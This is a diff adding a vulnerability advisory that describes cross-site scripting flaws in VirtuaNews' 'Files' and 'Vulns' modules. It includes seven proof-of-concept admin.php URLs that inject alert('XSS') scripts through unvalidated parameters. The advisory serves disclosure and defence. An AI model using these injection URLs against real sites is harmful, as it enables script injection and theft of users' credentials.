@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/9812/info
+
+It has been reported that the VirtuaNews non-default modules 'Files' and 'Vulns' are prone to multiple cross-site scripting vulnerabilities. These problems surround the application's failure to properly validate user supplied URI input. When exploited an attacker can execute arbitrary script and HTML code in the context of the vulnerable application.
+
+The supplied code is rendered in the browser in the context of the affected application. This may allow an attacker to craft a malicious link, facilitating a cross-site scripting attack.
+
+Attackers may exploit this vulnerability to steal authentication credentials. Other attacks may also be possible.
+
+Affecting the 'Vulns' module:
+http://www.example.com/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&mainnews=~~~~">&lt;/textarea&gt;<script>alert('XSS')</script>
+http://www.example.com/admin.php?action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&mainnews=~~~~">&lt;/textarea&gt;--><script>alert('XSS')</script>
+http://www.example.com/admin.php?">action=vulns_add&catid=SELECT&title=~~~~~~~~~~~&mainnews=~~~~">&lt;/textarea&gt;<script>alert('XSS')</script>
+
+Affecting the 'Files' module:
+http://www.example.com/admin.php?action=files&expand="><script>alert('XSS')</script>
+http://www.example.com/admin.php?action=files_cat_delete&id="><script>alert('XSS')</script>
+http://www.example.com/admin.php?action=files_check&catid="><script>alert('XSS')</script>
+http://www.example.com/admin.php?action=newslogo_upload&"><script>alert('XSS')</script>
